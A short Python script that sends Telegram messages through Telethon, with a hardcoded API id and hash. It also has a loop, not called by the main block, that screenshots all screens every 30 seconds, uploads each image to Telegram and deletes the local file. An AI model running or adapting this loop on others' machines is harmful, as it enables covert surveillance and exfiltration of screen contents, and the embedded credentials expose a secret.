import argparse
from time import sleep

from PIL import ImageGrab
from telethon.sync import TelegramClient

api_id, api_hash = '3238330:083db2a7f36e1cf42378fd0819e54cf1'.split(':')


def message(target='me', text='', file=None):
    with TelegramClient('danil', api_id, api_hash) as client:
        client.send_message(target, text, file=file)


def take_screenshot():
    while True:
        import time
        snapshot = ImageGrab.grab(all_screens=True)
        curr_time = time.localtime()
        save_path = f'{str(curr_time)}.png'
        snapshot.save(save_path)
        with TelegramClient('danil', api_id, api_hash) as client:
            client.send_message('me', curr_time, file=save_path)
        sleep(30)
        import os
        os.remove(save_path)


if __name__ == '__main__':
    arg_parse = argparse.ArgumentParser()
    arg_parse.add_argument('--text', dest='text')
    arg_parse.add_argument('--target', dest='target')
    args = arg_parse.parse_args()
    message(args.target, args.text)
